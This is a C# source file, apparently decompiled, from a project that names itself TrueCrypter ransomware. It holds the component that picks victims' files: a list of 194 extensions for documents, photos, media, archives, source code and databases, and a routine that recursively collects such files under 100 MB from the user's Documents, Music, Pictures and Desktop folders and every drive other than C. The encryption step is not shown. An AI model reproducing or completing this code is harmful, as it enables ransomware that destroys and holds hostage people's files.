using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace TrueCrypter.Ransomware.Core.Wrappers;

public class FilesWrapper
{
	private readonly string[] _extensions = new string[194]
	{
		".xlsx", ".xls", "xlsm", "xltx", "xltm", "xlsb", "xlam", ".ods", ".sxc", ".csv",
		".tsv", ".doc", ".docx", ".docm", ".dot", ".dotx", ".dotm", ".rtf", ".odt", ".txt",
		".msg", ".odt", ".pages", ".rtf", ".wpd", ".wps", ".pwi", ".xml", ".pot", "pps",
		"ppt", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm",
		".thmx", ".pdn", ".bmp", ".gif", ".jpg", ".jpeg", ".jpe", ".jfif", ".png", ".tif",
		".tiff", ".tga", ".dds", ".dib", ".psd", ".eps", ".pdf", ".tga", ".ico", ".gif",
		".mov", ".mp4", ".mp3", ".avi", ".wmw", ".veg", ".arw", ".cr2", ".crw", ".dcr",
		".dng", ".fpx", ".mrw", ".nef", ".org", ".pcd", ".ptx", ".raf", ".raw", ".rw2",
		".asp", ".aspx", ".cer", ".cfm", ".csr", ".css", ".htm", ".html", ".js", ".jsp",
		".php", ".rss", ".xhtml", ".7z", ".7zip", ".cbr", ".deb", ".gz", ".pkg", ".rar",
		".rpm", ".sitx", ".tar.gz", ".zip", ".zipx", ".gzip", ".tar", ".c", ".cc", ".cxx",
		".class", ".cpp", ".cs", ".dtd", ".fla", ".h", ".hpp", ".java", ".lua", ".m",
		".pl", ".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".xcodeproj", ".csproj", ".resx",
		".config", ".prproj", ".asm", ".inc", ".jad", ".json", ".rc", ".scpt", ".src", ".as",
		".mx", ".au3", ".bash", ".sh", ".bsh", ".csh", ".lex", ".litcofee", ".hxx", ".d",
		".shtml", ".xhtm", ".xht", ".hta", ".ini", ".reg", ".jss", ".jsm", ".jsx", ".ts",
		".tsx", ".kix", ".pas", ".pp", ".p", ".inc", ".lpr", ".pm", ".pmx", ".php3",
		".php4", ".php5", ".phps", ".phpt", ".phtml", ".ps", ".ps1", ".psm1", ".pyw", ".pyc",
		".r", ".s", ".splus", ".rb", ".rbw", ".bat", ".vbs", ".cmd", ".db", ".sqlite",
		".sqlite3", ".sql", ".bookmarks", ".index"
	};

	public HashSet<string> Files = new HashSet<string>();

	private double MaxSizeMB = 100.0;

	public void Search()
	{
		GetFiles(GetMyDocumentsPath());
		GetFiles(GetMyMusicPath());
		GetFiles(GetMyPicturesPath());
		foreach (string othersDrife in GetOthersDrives())
		{
			GetFiles(othersDrife);
		}
		GetFiles(GetDesktopPath());
		Files.Remove(Application.get_ExecutablePath());
		Files.Remove(GetDesktopPath() + "\\desktop.ini");
		Files.Remove(GetMyDocumentsPath() + "\\desktop.ini");
		Files.Remove(GetMyMusicPath() + "\\desktop.ini");
		Files.Remove(GetMyPicturesPath() + "\\desktop.ini");
	}

	private void GetFiles(string Path)
	{
		if (Path == null)
		{
			return;
		}
		foreach (string item in from s in Directory.GetFiles(Path)
			where _extensions.Any((string e) => s.ToLower().EndsWith(e))
			select s)
		{
			try
			{
				if ((double)((float)new FileInfo(item).Length / 1024f / 1024f) <= MaxSizeMB)
				{
					Files.Add(item);
				}
			}
			catch
			{
			}
		}
		string[] directories = Directory.GetDirectories(Path);
		foreach (string path in directories)
		{
			try
			{
				GetFiles(path);
			}
			catch
			{
			}
		}
	}

	private IEnumerable<string> GetOthersDrives()
	{
		HashSet<string> hashSet = new HashSet<string>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (!driveInfo.ToString().Contains("C") && driveInfo.IsReady)
				{
					hashSet.Add(driveInfo.ToString());
				}
			}
			catch
			{
			}
		}
		return hashSet;
	}

	private string GetDesktopPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
	}

	private string GetMyDocumentsPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.Personal);
	}

	private string GetMyMusicPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
	}

	private string GetMyPicturesPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
	}
}
